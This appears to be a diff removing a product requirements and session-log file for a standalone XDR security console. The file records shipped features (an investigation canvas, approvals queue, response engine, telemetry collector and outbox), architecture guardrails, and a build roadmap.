-P1 force-layout stays queued per your explicit direction ("only after
-the semantic/density model is implemented").
-
-### What shipped
-**Rich semantic node glyphs** — 13 canonical node types (incident,
-host, user, process, file, ip, domain, url, hash, evidence,
-technique, verdict, response, cluster) each with:
-- Its own icon + accent color.
-- A shape variant (`hex` for verdicts/incidents/MITRE, `square` for
-  host/response, `diamond` for indicators/file, `circle` for
-  process/user/evidence).
-- Up to 3 real-data badges: severity, evidence_count,
-  technique_count, response state, cluster count.
-
-**Semantic edge taxonomy + legend** — every edge is now one of eight
-authoritative kinds:
-`parent_of` · `executed` · `created` · `connected_to` ·
-`resolved_to` · `mapped_to` · `responded` · `produced`.  Never a
-generic "connected" and never an edge without a real referent.  On
-hover / selection the semantic tag renders mid-edge.  The legend
-below the canvas lists every entity type AND every relationship type.
-
-**Expandable clusters** — hosts with ≥ 4 executed processes fold into
-a single cluster node with a `+` glyph and a count badge.  Clicking
-expands it in place; a "Collapse cluster" button re-folds.  Fold
-never hides data — every child is one click away.
-
-**Minimap** — top-down miniature of the full graph in the bottom-
-right of the canvas.  Nodes shown by type color.  A dashed red
-frame shows the current pan/zoom viewport.  Toggle via toolbar.
-
-**Investigation Toolbar** (persistent above the canvas)
-`FIT VIEW · RESET · MINIMAP · TIMELINE · FILTER` with filter chips:
-`All · Evidence · Process · Network · Identity · MITRE · Response`.
-The filter dims non-matching nodes AND edges across the whole
-synchronized surface.
-
-**Entity Contextual Actions** — Inspector now shows a pill strip
-of deep-links per entity type:
-`Investigate · Trajectory · Related · Process Tree · Threat Intel ·
-MITRE · Response Chain · Response`.  Each pill goes to a real
-NivXRay route; missing pills are simply not rendered (never faked).
-
-### One synchronized surface (preserved & extended)
-Canvas ↔ Timeline ↔ Attack Story ↔ Inspector ↔ MITRE stay in lock-
-step.  Filter and highlight now propagate to timeline markers, edge
-opacity, and Inspector visibility — a single click updates every
-panel.
-
-### Owner-locked invariants (still honoured)
-- No fabricated relationships. Every edge originates from a real
-  incident-payload attribute or a real Response Engine ref.
-- Cluster folding hides visual noise, never data.
-- Filters and highlights are additive projections — nothing is
-  invented on the client.
-- Existing Evidence / Timeline / Attack Story / ATT&CK / Verdict /
-  Report subtabs remain intact below the workspace.
-
-### Verification
-- `yarn build` clean. `XdrIncidentDetailPage` chunk grew 65KB → 81KB
-  (visual-intelligence code path).
-- All three test suites remain 100% green: Response Engine 18/18 ·
-  Base backend `/api/xdr/response-evidence` 7/7 · Collector 44/44.
-
-### Explicitly deferred
-- **P1 · d3-force layout** — will be added once the semantic model
-  proves out in production incidents (per your direction).
-- **Phase C · CrowdStrike adapter** — next milestone after the UI
-  pass.
-
----
-
-
----
-
-## ✅ 2026-02-10 · One Investigation Surface + Approvals Queue + Evidence Deep-Link
-
-Landed the three priorities you named in order:
-
-### 1 · Approvals Queue (`/xdr/respond/approvals`)
-- **`XdrApprovalsPage.jsx`** — dedicated peer-approval queue.
-- Auto-refresh every 8s. Search + tenant filter.
-- Inline approve / reject with optional reason (recorded in audit).
-- Peer requirement enforced client-side: the requesting analyst
-  cannot approve their own action.
-- "NOT WIRED" banner honours the same principle as the Integrations
-  tab when `VITE_XDR_RESPONSE_URL` is unset.
-- Deep-links each row to its incident and playbook if the invoker
-  context carries them.
-- Wired into the Respond section of the shell nav.
-
-### 2 · Evidence Deep-Linking (`/xdr/evidence/:executionId`)
-- **`XdrEvidenceRefPage.jsx`** — response-chain deep-link surface
-  that joins the Response Engine execution record with the base
-  backend's persisted evidence / audit / timeline triple.
-- Chain view: `Incident → Invoker → Execution → Action → Evidence →
-  Audit → Timeline`.
-- Approval trail + forwarding metadata sidebar.
-- Investigation Canvas response nodes now open this page via a
-  first-class "Open full response chain" link + pivot-menu entry.
-
-### 3 · One Synchronized Investigation Surface
-Every panel now selects / highlights in lockstep — as you specified,
-Canvas + Timeline + Inspector + Attack Story + MITRE + Response
-behave as ONE surface:
-- **Synchronized Timeline** (`SynchronizedTimeline`, new component)
-  — real markers minted from `incident.created_at` / evidence
-  timestamps / response `completed_at`. Scrolls the selected marker
-  into view. Hovering a marker highlights the technique/rule on the
-  canvas; clicking selects the node.
-- **Attack Story ↔ Canvas ↔ Timeline** cross-highlight is fully
-  bidirectional: clicking an Attack-Story sentence focuses the
-  originating node, highlights the technique, and scrolls the
-  timeline. Selecting a canvas node visually pins the matching
-  Attack-Story line.
-- **Response nodes in-canvas** deep-link to the new Evidence Ref
-  page directly from the Inspector.
-
-### Verification
-- `yarn build` clean, two new lazy chunks (`XdrApprovalsPage`,
-  `XdrEvidenceRefPage`).
-- All three test suites remain 100% green (Response Engine 18/18 ·
-  Base backend `/api/xdr/response-evidence` 7/7 · Collector 44/44).
-
-### Owner-locked invariants held
-- No fake nodes / edges / markers. Every visual element is a
-  projection of real incident payload data or a real Response
-  Engine / base-backend record.
-- The Response Engine SQLite is authoritative for execution state.
-- The base backend is authoritative for evidence / audit / timeline.
-- The two truths are joined through the ref triple, surfaced in
-  both the Investigation Canvas and the new Evidence Ref page.
-
----
-
-
----
-
-## ✅ 2026-02-10 · Evidence-First Investigation Workspace (UI depth pass)
-
-Landed the Cortex-level UI depth pass — evolving (not replacing) the
-Incident Investigation view into a real, evidence-backed workspace.
-
-### What shipped
-- **`EvidenceFirstInvestigationWorkspace.jsx`** — new central component:
-  - **Investigation Canvas** — SVG interactive graph, zoom / pan
-    (mouse-drag + scroll wheel), select, right-click. Nodes minted
-    ONLY from the canonical incident payload (hosts, users, IOCs,
-    Stage-2 evidence, MITRE mappings via `RULE_TO_TECHNIQUE`,
-    response executions). Never fabricates a relationship.
-  - **Entity Inspector** (right panel) — per-node type (evidence,
-    process, host, user, IP/hash/domain/URL, MITRE technique,
-    response execution). Shows source, timestamp, host/user,
-    command line, hashes, verdict contribution, provenance,
-    evidence_ref, related response execution.
-  - **Analyst Pivot Menu** (right-click) — Investigate, Show process
-    tree, Show device trajectory, Search this IOC, Search related
-    incidents, Pivot to user / host / MITRE technique, Create
-    automation rule, Run response action, Add to case notes.
-  - **Attack Story Panel** — evidence-backed sentences (built from
-    Stage-2 evidence + response executions). Click a sentence →
-    highlights the technique / rule on the canvas. Cross-highlight
-    is bidirectional.
-  - **Response integration** — every response execution appears as
-    a first-class node on the canvas, linked from the incident by a
-    `responded` edge and connected to its `evidence_ref` node.
-    Never rendered as an isolated SOAR blob.
-  - **MITRE integration** — selecting or clicking a technique node
-    highlights all supporting evidence + processes + attack-story
-    sentences on the canvas simultaneously.
-- **`XdrIncidentDetailPage.jsx`** — Investigation tab now leads with
-  the Workspace; legacy deep-link subtabs are preserved BELOW as
-  "Related capabilities" so no existing route or capability is lost.
-
-### Design language
-- Dense enterprise-SOC layout, dark analyst workspace.
-- Restrained accent palette (single color per entity type).
-- Strong typography hierarchy: mono for identifiers, sans for prose.
-- SVG-based canvas — genuinely interactive (drag / zoom / select /
-  context-menu), not decorative.
-- No AI-slop patterns: no purple gradients, no equal-spacing hero
-  cards, no fake data.
-
-### Verification
-- `yarn build` clean.
-- All three test suites remain 100% green (Response Engine 18/18 ·
-  Base backend `/api/xdr/response-evidence` 7/7 · Collector 44/44).
-
-### Note on Integrations tab
-The Integrations tab is honest, not stale: it shows
-`COLLECTOR RUNTIME NOT DEPLOYED` because `VITE_XDR_COLLECTOR_URL`
-is unset in Vercel. To wire it: deploy
-`/app/apps/nivxray-xdr-collector` to a public URL, set the env var,
-and redeploy the Vercel app.
-
----
-
-
----
-
-## ✅ 2026-02-10 · Response Execution Integration slice DONE
-
-Landed **the complete "Implement Now" instruction**: the standalone
-Response Engine now owns a persisted execution state machine and an
-approval workflow, and every invocation surface (Playbook Designer
-Run, Automation Rules, Analyst Response Drawer, Visual Execution
-Studio) speaks the *same* execution contract.
-
-### What shipped
-- **Base backend** — added ONE new endpoint:
-  `POST /api/xdr/response-evidence` (idempotent on `execution_id`,
-  provenance-validated, tenant-scoped). NO changes to SSOT / Verdict
-  / IKG / detection code. New collections: `xdr_response_evidence`,
-  `xdr_response_audit`, `xdr_response_timeline`,
-  `xdr_response_executions`. 7 focused pytest tests, all green.
-- **Response Engine** (`/app/apps/nivxray-xdr-response`) — refactored
-  to a durable state machine:
-  `QUEUED → RUNNING → WAITING_APPROVAL → EXECUTING → FORWARDING_EVIDENCE → SUCCEEDED`
-  with `FAILED_APPROVAL / FAILED_TARGET / FAILED_EXECUTION /
-  FAILED_FORWARDING / FAILED_RECOVERED / REJECTED`. Dedicated
-  SQLite DB at `data/executions.db` (never shared with the
-  Collector). New endpoints:
-  `POST /api/respond/approve/{execution_id}`,
-  `POST /api/respond/reject/{execution_id}`,
-  `GET  /api/respond/pending-approvals?tenant_id=…`. 18/18 pytest
-  green.
-- **Evidence-first invariant** — `SUCCEEDED` requires adapter OK
-  AND evidence forwarding OK. If forwarding to the base endpoint
-  fails, the execution is reported as `FAILED_FORWARDING`; never
-  fabricates success.
-- **Restart recovery** — RUNNING / EXECUTING / FORWARDING rows on
-  boot flip to `FAILED_RECOVERED`. No silent re-firing.
-- **Frontend** (`/app/apps/nivxray-xdr`):
-  - `responseEngineApi.js` gained `approve`, `reject`, `pollUntilTerminal`,
-    `buildExecutePayload`, canonical state constants.
-  - `AnalystResponseDrawer.jsx` — right-side drawer on
-    `/xdr/incidents/:id`. `invoker.kind = "analyst"`. Peer approval
-    strictly enforced ("cannot approve your own request").
-  - `VisualExecutionStudio.jsx` — evolved simulator with breakpoints,
-    pause / resume / step-over / step-into, force TRUE/FALSE branch,
-    animated node highlighting, per-node execution card
-    (state, duration, evidence_ref, audit_ref, timeline_ref,
-    inline approve / reject).
-  - `XdrPlaybookDesignerPage.jsx` — Design ↔ Studio view switcher.
-    "Run" button opens Studio in Live mode.
-  - `XdrAutomationRuleEditorPage.jsx` — added "Live Run" that
-    dispatches through the SAME Response Engine contract used by
-    playbooks and the drawer.
-- **Contracts** — `RESPONSE_CONTRACT.md` + `RESPONSE_INGEST_CONTRACT.md`
-  fully documented (state machine, approval lifecycle, idempotency,
-  evidence invariants, invoker kinds, target resolution, adapter
-  status, deploy variables).
-
-### Verification
-- Response Engine pytest: 18/18 (approval, idempotency, tenant
-  isolation, target resolution, missing scope/param, restart
-  recovery, dry-run, playbook simulator, action registry).
-- Base backend pytest for evidence endpoint: 7/7.
-- Collector pytest: **preserved 44/44 (not touched)**.
-- Frontend `yarn build`: clean.
-- Full E2E via curl: analyst-invoker → `WAITING_APPROVAL` → peer
-  approve → `SUCCEEDED` with real evidence_ref / audit_ref /
-  timeline_ref written to the base backend and read-back verified.
-
-### Boundary (owner-locked, honoured)
-- Base backend NOT modified except for the single evidence sink
-  endpoint.
-- Response Engine remains an independently-deployable service with
-  its own dedicated database.
-- Adapters remain deterministic Phase-1 stubs (`adapter_status:
-  AVAILABLE`, `simulation_only: true`). Phase C plugs real
-  CrowdStrike / Defender / SentinelOne / Cisco SEP adapters without
-  changing the execution model.
-
----
-
----
-
-## 🔴 The one rule that supersedes everything else
-
-> If the change is required to make **NivXRay XDR** work, implement it in
-> `/app/apps/nivxray-xdr/` (repo `jpreddy017/nivxray-xdr`, live at
-> https://nivxray-xdr.vercel.app) **or through an existing API
-> contract**.  If the change would modify the existing NivXRay product
-> itself, **do not do it**.
-
-When there is ambiguity between "modify NivXRay" and "build NivXRay
-XDR", the default interpretation is always **BUILD THE STANDALONE
-NIVXRAY XDR**.
-
----
-
-## Architecture (one picture)
-
-```
-        ┌─────────────────────────────┐
-        │      EXISTING NIVXRAY       │
-        │      (protected · read-only) │
-        │                             │
-        │ Workspace · Evidence · IKG  │
-        │ Activity Inventory · Verdict│
-        │ Process Tree · Trajectory   │
-        │ Command Intel · MITRE       │
-        │ Threat Intel · Reports      │
-        └──────────────┬──────────────┘
-                       │
-              Authenticated APIs
-                       │
-                       ▼
-        ┌─────────────────────────────┐
-        │       NIVXRAY XDR           │
-        │     STANDALONE TOOL          │
-        │                             │
-        │ Dashboard · Incidents        │
-        │ Investigation Console        │
-        │ Endpoints · NivXForge EDR    │
-        │ Activity · Response          │
-        │ Intelligence · Operations    │
-        └─────────────────────────────┘
-
-One security truth. Two application boundaries.
-Separate application  ≠  Separate security truth.
-```
-
----
-
-## 🔴 Non-negotiable guardrails (every session)
-
-- **Never modify** `/app/frontend`, `/analyst`, `/edr/trajectory`, or any existing NivXRay engine.
-- **Never duplicate** Workspace · Evidence SSOT · Incident SSOT · Verdict Engine · Process Tree · Device Trajectory · Command Intelligence · MITRE · IKG · Activity Inventory · TI · Reports.
-- **Never fake telemetry.**  Preserve semantically distinct states: `NOT CONNECTED · NOT AVAILABLE · NO MATCHING EVIDENCE · ERROR`.  Never collapse them into "Benign".
-- **Never inflate severity** to populate KPI cards.  Severity is evidence-driven.
-- **Never make destructive actions instant one-click.**  Response goes through the Approval Loop.
-- **Never claim a capability that isn't wired.**  Negative Explainability is a first-class product feature.
-- **Never co-host** XDR under the base frontend.  Separate build, runtime, deployment.
-- **Never repeat scope-confirmation questions** once a direction is locked.  Start implementing.
-- **Never work on Cisco Device Trajectory fidelity** during the current P0.  That is a separate future slice.
-- **Address the implementation agent as Emergent**, not Claude or Claude Code.
-
----
-
-## Product identity
-
-- NivXRay is an **evidence-first, investigation-centric security intelligence platform** — not merely EDR/XDR/SIEM/SOAR/TIP/NDR/UEBA/etc.
-- Core loop: **Evidence → Context → Correlation → Reasoning → Verdict → Decision → Response → New Evidence** (recursive via IUE).
-- Deterministic-first; AI is optional assistance, never the decision authority.
-- Every conclusion traces back to evidence with full provenance.  Reproducible.
-
-## NivXRay XDR identity
-
-- **Standalone tool.**  New frontend, build, runtime, deployment, repo, auth UI.
-- Consumes existing NivXRay APIs.  Never re-implements engines.
-- Live: https://nivxray-xdr.vercel.app · Repo: `jpreddy017/nivxray-xdr` · Vercel auto-deploy on push to `main`.
-- Brand: circuit-tree mark + `NiVXRAY XDR` wordmark (orange `i` accent) + `EXTENDED DETECTION / RESPONSE` tagline.  Enterprise, not sci-fi.
-- Visual identity is NivXRay-original.  ~95% operational equivalence to Cisco Secure Endpoint is a *behavioral* benchmark for the future Trajectory slice, not a visual clone.
-
----
-
-## Current execution point
-
-**Build the entire `nivxray-one-xdr-console_New.html` mockup slice-by-slice** — verbatim visual + behavioral fidelity — while enforcing every architecture guardrail below.  Device Trajectory is **UNLOCKED** as of 2026-08-29 (owner directive) and is now part of the standalone-XDR native surface.
-
-### Slice queue (owner-locked build order)
-
-| # | Slice | Notes |
-| :- | :---- | :---- |
-| 1 | **Pivot menus** — hover-triggered contextual overlay on every entity (process, user, ip, hash, domain, mitre). Unlocks all downstream slices. | Small, high-leverage |
-| 2 | **Native Investigation sub-tab bodies** — replace "Open on existing NivXRay ↗" with inline rendering: Evidence (datalake) · Timeline · Attack Story · Evidence Graph · MITRE ATT&CK · Verdict Summary · Report. Reuses `/api/incidents/:id/summary`, `/api/activity/inventory`, IKG APIs. | 6 sub-tabs |
-| 3 | **Detection Sourcing** — first-class `detected_by` column across Suspicious Elements + Detections tables, with pivot back to the source engine. | Small polish |
-| 4 | **Deterministic Severity Mapper** — XDR-side projection over `verdict_stage2` + evidence rollup; preserves source severity, adds provenance. Never inflate. | Small |
-| 5 | **Forge EDR landing** — richer device inventory (OS · IP · user · risk score · agent version · linked incident) matching mockup columns. | Extends current Endpoints page |
-| 6 | **Device Trajectory 3-pane canvas** — left inventory · center timeline canvas (density strip + time window + incident-centering) · right activity details. Consumes existing `/edr/*` telemetry projections; XDR renders natively. **Do NOT modify `/edr/trajectory` on the base app.** | Largest slice — likely multi-session |
-| 7 | **Command Intelligence native page** — XDR-native decode viewer with `/api/analyze` under the hood.  Handoff receives incident context. | Medium |
-| 8 | **Response Approval Loop + Response Global** — REQUESTED → PENDING → APPROVED/REJECTED → QUEUED → EXECUTING → SUCCEEDED/FAILED → VERIFIED, immutable audit, no fake success. | Medium |
-| 9 | **Admin sub-pages** (13 items: Integrations · Data Sources · Collectors · Agents · Telemetry Studio · Telemetry Health · Parsers · Normalization · Detection Rules · Response Policies · Users & Roles · API/Webhooks · Platform Health). | Large — dashboard-style pages |
-| 10 | Evidence drawer overlay · Attachments · Analyst Notes | Polish |
-
-### Master rule (unchanged)
-
-Every slice is implemented **only** in `/app/apps/nivxray-xdr/` (mirror) + `jpreddy017/nivxray-xdr` (canonical).
-Consume existing NivXRay APIs; never duplicate engines, SSOT, or database.
-Base NivXRay (`/app/frontend`, `/analyst`, `/edr/trajectory`) stays untouched.
-For Trajectory: XDR builds its own native canvas — it does not embed, iframe, or modify the base `/edr/trajectory` implementation.  Data comes from existing telemetry APIs.
-
-Structure:
-```
-Summary
-Investigation
-  ├── Attack Story
-  ├── Evidence
-  ├── Entities
-  ├── MITRE ATT&CK
-  └── Timeline
-Activity
-Response
-```
-
-**Contextual pivots** (each opens the base NivXRay capability in a new tab; XDR never re-implements):
-
-| Entity          | Pivot destination                    |
-| :-------------- | :----------------------------------- |
-| Process         | base `/edr/trajectory` (Process Tree scope) |
-| Command line    | base `/analyze` (Command Intelligence)      |
-| Endpoint        | base `/edr/trajectory?device=…`             |
-| Detection       | base `/edr/trajectory?event=…`              |
-| IOC             | base `/threat-intel?ioc=…`                  |
-| MITRE technique | base `/heatmap?technique=…`                 |
-| Evidence node   | base `/analyst?case=…&evidence=…`           |
-
-**Data sources** — all consumed via authenticated API from the base NivXRay backend:
-- `GET /api/incidents/{id}` (Incident SSOT)
-- `GET /api/incidents/{id}/summary` (deterministic summary + gaps)
-- `POST /api/activity/inventory` (Activity + Timeline)
-- Existing Attack Story / IKG / Verdict / MITRE projections
-
-**Summary tab must include:** verdict · severity · confidence · attack progression · evidence summary · affected entities · important detections · evidence gaps (Negative Explainability) · recommended next evidence · available response actions.
-
----
-
-## Roadmap after P0
-
-- **P1** — Native Endpoints view at `/xdr/endpoints` reusing `/api/edr/*`.  No new endpoint engine.  ✅ **DONE (Slice 6 · 2026-02)**.
-- **P2** — Deterministic severity mapper.  Evidence-driven only.
-- **Later — Response Approval Loop** — `REQUESTED → PENDING → APPROVED/REJECTED → QUEUED → EXECUTING → SUCCEEDED/FAILED → VERIFIED`, immutable audit (actor · timestamp · action · target · prev state · new state · verification).
-- **Later — Device Trajectory operational fidelity** (~95% Cisco Secure Endpoint behavioral equivalence) — Slice 6 v2 (deeper canvas density + zoom-to-window).
-- **Later — Additional telemetry domains** — NDR / ITDR / Email / Cloud / Application-API / Data Security / CTEM.  Each shows honest state until wired.
-
----
-
-## Locked slice roadmap (owner-approved, mockup-order)
-
-- Slice 1  — Contextual Pivot menus ✅
-- Slice 2  — Native Investigation sub-tab bodies ✅
-- Slice 3  — Detection Sourcing (`detected_by` first-class + engine pivot) ✅
-- Slice 6  — Native XDR Device Trajectory Canvas (v1 · category-lane) ✅
-- Slice 7  — Sidebar correction + Overview IA + Domain Cards + Domain routes ✅
-- **Slice 8**  — Device Trajectory IA rewrite (entity-per-row · density strips · compromise band · lineage connectors · tri-directional sync)
-- **Slice 9**  — Lifecycle audit tightening (button matrix · Hold modal · banner · immutable Activity writes)
-- **Slice 10** — Native XDR Admin Console (all 14 admin surfaces reading authoritative APIs, never deep-linking base `/admin`) ✅
-- **Slice 11** — Response Approval Loop (Requested → Policy Check → Executed → Verified · immutable audit)
-- **Slice 12** — Global Response Center (cross-incident view)
-- **Slice 13** — Other Domain Consoles (NDR / ITDR / Email / Cloud / App / Data / Exposure / IOC — reproduce `tab*()` from the mockup)
-- **Slice 14** — Native Command Intelligence (inline in XDR, consumes existing decoder API)
-- **Slice 15** — Activity / Notes / Attachments completion (separated sections, SHA-256, previews)
-- **Slice 16** — Final native-XDR / deep-link elimination audit
-
-## Permanent rules (owner-locked)
-
-1. **No base-UI deep-links in "complete" XDR features.**  Before any
-   XDR capability is declared complete, audit it for `/analyze`,
-   `/heatmap`, `/analyst`, `/v2/irg`, `/edr/trajectory`, or `/admin`
-   deep-links.  If the capability belongs to the XDR product it
-   must ultimately have a native XDR implementation reading the
-   authoritative NivXRay APIs.
-2. **Reuse APIs, not UI.**  Native XDR UI → existing authoritative
-   NivXRay APIs (Verdict, Evidence, IKG, Activity Inventory,
-   Process Tree, Decoder, MITRE, Health).  No engine, SSOT, or
-   security-model duplication.
-3. **Data honesty · four distinct states** — never collapse into a
-   generic "empty":
-     - `NOT OBSERVED`     — telemetry ran, negative result
-     - `NOT ESTABLISHED`  — projection not built yet
-     - `NOT AVAILABLE`    — capability absent from the SSOT
-     - `NOT CONNECTED`    — integration not wired for tenant
-4. **Quality bar (locked)** — every component must be more
-   reliable + explainable + efficient than Microsoft Defender XDR,
-   CrowdStrike Falcon, Cisco Secure Endpoint / Cisco XDR:
-     - provenance on every field
-     - rule + weight + source engine on every verdict/detection
-     - sub-second incident open
-     - immutable audit on every state transition + response action
-     - server-side tenant firewall (never client-side filtering)
-5. **Enterprise design bar (locked)** — every tab, page, button,
-   icon, table, badge, modal, empty-state, chart, and micro-
-   interaction must be first-class enterprise-grade.  No inline
-   ad-hoc styling; every surface consumes the shared design tokens
-   + component primitives.  Before designing or building a new
-   surface, invoke `design_agent_full_stack` for the visual
-   blueprint, then implement against it.  Reference bar:
-   Splunk MC · Elastic Security · Sentinel · Palo Alto XSIAM ·
-   CrowdStrike Falcon Next-Gen · Vercel dashboard.  Ordinary
-   framework-default look is a bug.
-
----
-
-## Live baseline (verified this session)
-
-- Standalone XDR shipped: Dashboard operational, KPIs filter queue, sidebar/top-nav all clickable (no dead UI), Incident detail 4 tabs, NivXForge EDR launcher opens base `/edr/trajectory` in new tab.
-- Cross-origin auth confirmed: shared `nvx_token` in localStorage, tenant scoping enforced server-side.
-- Backend regression: **821 passed / 0 failed / 4 skipped** (held after Slice 6 · 2026-02).
-- Base NivXRay: untouched.
-
-## Session log
-
-### 2026-02 · Slice 10 · Native XDR Admin Console · SHIPPED
-- 14 native admin surfaces at `/xdr/admin/*`, each reading authoritative NivXRay APIs.  No deep-link to base `/admin`.
-- Verified: `/admin/stats` populates Overview KV grid; `/admin/users` renders real table; `/health` populates Platform Health; unconnected surfaces (Collectors / Agents / Parsers / Normalization / Response-Policies / API-Webhooks) surface `NOT CONNECTED` with integration guidance.
-- Sidebar Administration items no longer disabled — every one navigates natively.
-- Files: `src/xdr/admin/adminMeta.js`, `src/xdr/pages/XdrAdminPage.jsx`.
-- `pytest tests/canonical/{ssot,edr,incidents}` — 87 passed.
-
-### 2026-02 · Slice 7 · Sidebar + Overview IA + Domain routes · SHIPPED
-- Sidebar Operations reduced to `Incidents · My Queue · Response`.  Dashboard duplicate + global Endpoints peer removed.
-- Investigation sub-tabs corrected: removed erroneous `summary`; Summary body moved onto Overview.
-- New `DomainCardsGrid` on Overview + persistent `IncidentContextStrip` on all six domain routes.
-- Intelligence deep-links replaced by native `XdrReservedPage` placeholders naming the authoritative API each future slice will consume.
-- Files: `src/xdr/domains/domainMeta.js`, `src/xdr/components/{DomainCardsGrid,IncidentContextStrip}.jsx`, `src/xdr/pages/{XdrIncidentDomainPage,XdrReservedPage}.jsx`.
-
-### 2026-02 · Slice 6 · Native XDR Device Trajectory Canvas · SHIPPED
-- New backend projections (additive, `/app/backend/routers/edr.py`):
-  - `GET /api/edr/endpoints` — device inventory aggregated from `workspace_cases`.
-  - `GET /api/edr/device-trajectory?device=<host>&hours=<n>` — device-scoped detections + activity nodes, lane-mapped, time-windowed.
-- New XDR pages:
-  - `/xdr/endpoints` — `XdrEndpointsPage.jsx` with row → **View Trajectory**.
-  - `/xdr/endpoints/:device/trajectory` — `XdrDeviceTrajectoryPage.jsx` (3-pane).
-- New components:
-  - `TrajectoryTimelineCanvas.jsx` — hybrid `<canvas>` (density + hour ticks) + `<svg>` overlay (interactive markers, hover, selection).
-  - `Pivot.jsx` — Slice 1 contextual pivots consumed by details pane (host/process/file/rule/ip/domain/hash/url).
-- SSOT isolation test allow-list extended to Slice 6 paths (`tests/canonical/ssot/test_ssot_isolation.py`).
-- Verified: `pytest tests/canonical` → **821 passed, 4 skipped** (no regressions).
-- Verified via screenshot: endpoints, trajectory canvas w/ markers, selected event details w/ Pivot.
-
-## Session-start prompt for the next agent
-
-> Continue mockup slice-by-slice build per PRD.md.  Standalone NivXRay
-> XDR only.  Do not touch the base NivXRay application.  Slice 10
-> (Native XDR Admin Console) is DONE.  Next: **Slice 8 · Device
-> Trajectory IA rewrite** — entity-per-row, density strips,
-> compromise-window band, lineage connectors, tri-directional pane
-> sync, right-pane default Device Summary, `x3` duplicate grouping,
-> time-navigation beyond the incident window.  Do not begin without
-> owner confirmation of slice.
-
-## Test credentials
-
-See `/app/memory/test_credentials.md` — `admin@nivxray.com` (same token on both hosts).
-
----
-
-## 2026-02 Fork — Session Delivery Log
-
-### Native MITRE ATT&CK Heatmap (COMPLETE · deployed)
-- Route: `/xdr/intelligence/mitre` (was a locked "reserved" deep-link).
-- Ships the FULL MITRE ATT&CK Enterprise v16 top-level taxonomy: 14
-  tactics, **199 distinct techniques (230 cell mappings)**.
-- Live vs. static separation: KPI grid shows only live metrics
-  (Detections window, Techniques Observed, Rule Coverage, Incidents
-  Scanned). Static catalog constants moved to a meta strip.
-- Refresh button: spinner + label + clears filter + clears selection
-  + drops cached incidents + increments a visible `Refreshes` counter.
-  Auto-poll every 30s. "Last synced Xs ago" ticks live.
-- Sidebar entry promoted from reserved (locked) to live.
-- Deployed to Vercel: commits `bddca0b → 1d9be9c → e293ada` on
-  `jpreddy017/nivxray-xdr` `main`. Vercel auto-build handles rollout.
-
-### XDR Collector Phase B (COMPLETE · service ready to deploy)
-Location: `/app/apps/nivxray-xdr-collector` (independent Docker service).
-Three generic transport connectors, all with real transport code (not
-UI stubs):
-
-- **REST Poller** — httpx-based, bearer/basic/api-key auth, cursor
-  pagination, checkpoint advancement, 429 → rate_limited, 401 →
-  authentication_failed. Async scheduler runs one task per instance
-  at `interval_seconds`.
-- **Webhook Receiver** — `POST /api/xdr/webhooks/{secret_id}`, HMAC
-  verification (`hmac.compare_digest`), replay window 5 min via
-  `X-Timestamp`. Missing/mismatched signature → HTTP 401 with reason,
-  never 500.
-- **Syslog Collector** — asyncio UDP + TCP listeners, RFC3164 and
-  RFC5424 parsers, bind-conflict safety, per-instance socket in
-  `SyslogRunner`.
-
-Cross-cutting:
-- `ConnectorStore` — in-memory + optional JSON mirror at
-  `${XDR_STATE_DIR}/connectors.json` (chmod 600), credentials
-  redacted in every API response.
-- `DedupCache` — bounded per-connector LRU keyed on `source_event_id`.
-- `IngestClient` — best-effort forwarder to `NIVX_INGEST_URL`.
-  Honestly reports `queued` when no ingest URL is configured; Phase
-  B.5 replaces with durable outbox + DLQ.
-- Full management API surface: `/api/xdr/source-types`,
-  `/api/xdr/connectors` CRUD + control (test/start/stop/inject),
-  `/api/xdr/telemetry-health`, `/api/xdr/data-sources`,
-  `/api/xdr/webhooks/{secret_id}`.
-
-Testing:
-- 27/27 pytest pass (parsers 7, REST poller 4, webhook 7, syslog 5
-  with real UDP+TCP socket binds, routes 3 with FastAPI lifespan).
-- Live E2E verified via curl: created webhook, POSTed 3 events,
-  `events_collected: 3`, cleanup successful.
-
-Base backend invariant preserved: `/api/health` = 200, `/app/frontend`
-and `/app/backend` untouched, 87-pass baseline unaffected.
-
-### Immediate backlog (post-fork)
-- **P0 · Phase B.5** — durable outbox + DLQ + retry/backoff, real
-  forwarding to authoritative NivXRay ingest, observability metrics
-  in `/api/xdr/telemetry-health`.
-- **P1 · Deploy the collector** — publish Docker image, wire
-  `NIVX_INGEST_URL`/`NIVX_INGEST_TOKEN` at the tenant edge.
-- **P2 · Phase C** — CrowdStrike / Defender / SentinelOne / Cisco SEP
-  vendor connectors on the Phase B foundation.
-- **P3 · Phase D** — Windows WEF / WinRM / WMI collectors.
-- **P4 · Slice 8** — Device Trajectory IA rewrite (entity-per-row).
-- **P4 · Slice 9** — Lifecycle + immutable Activity.
-- **P4 · Slice 11** — Response Approval Loop.
-- **P4 · Slice 12** — Global Response Center.
-- **P5 · Slices 13-16** — remaining domain consoles, native Command
-  Intelligence, Notes/Attachments.
-
----
-
-## 2026-02 Fork · Continuation Log — Phase B.5 + Wizard + Pivot
-
-### Phase B.5 · Durable delivery (COMPLETE · service-ready)
-- **Persistent SQLite outbox** at `${XDR_STATE_DIR}/outbox.db`
-  (falls back to `:memory:` for tests).  Every canonical envelope
-  passes through the outbox BEFORE being reported as delivered.
-- **Event lifecycle**: RECEIVED → QUEUED → DELIVERING → DELIVERED /
-  RETRYING / DEAD_LETTER.
-- **Idempotency** via a unique index on
-  `(tenant_id, connector_id, source_event_id)` so vendor retries and
-  webhook redeliveries never double-insert.
-- **Restart recovery**: on `Outbox()` init, any rows stuck in
-  DELIVERING are reset to QUEUED — ingest is expected to be
-  idempotent so replay is safe.
-- **Ingest classifier** (`framework/delivery.py`): 2xx = OK,
-  5xx/408/429/timeout/transport-error = RETRYABLE, other 4xx = FATAL.
-  Never silently accepts an event as delivered.
-- **Retry policy**: exponential backoff (30s, 60s, 2m, 5m, 10m, 20m,
-  30m, 1h — 8 attempts).  Exhausted rows land in DEAD_LETTER; a
-  `POST /api/xdr/outbox/{id}/replay` endpoint requeues them.
-- **Delivery worker** (`framework/delivery_worker.py`) — background
-  asyncio task drains the outbox every 2s.  Exposes tick counters,
-  last-tick timestamp, last error.
-- **Health endpoints**: `/api/xdr/outbox/health` composes ingest +
-  outbox + worker into a single HEALTHY / DEGRADED / IDLE /
-  NOT_CONFIGURED state.  Root `/health` includes the same block plus
-  transport counters.
-- **Metrics** in `/api/xdr/telemetry-health`: per-transport health,
-  ingest counters (delivered / failed_retryable / failed_fatal /
-  last_error / last_delivery_at), outbox counts by status, queue
-  depth, oldest queued, worker running/ticks.
-- **Test suite**: 41/41 pass (12 outbox — enqueue, dedupe by event-id,
